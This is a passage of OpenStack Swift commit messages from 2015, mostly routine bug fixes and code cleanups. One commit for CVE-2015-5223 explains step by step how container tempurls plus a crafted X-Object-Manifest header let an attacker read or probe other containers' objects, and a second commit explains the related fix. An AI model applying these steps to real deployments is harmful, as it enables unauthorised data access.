Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
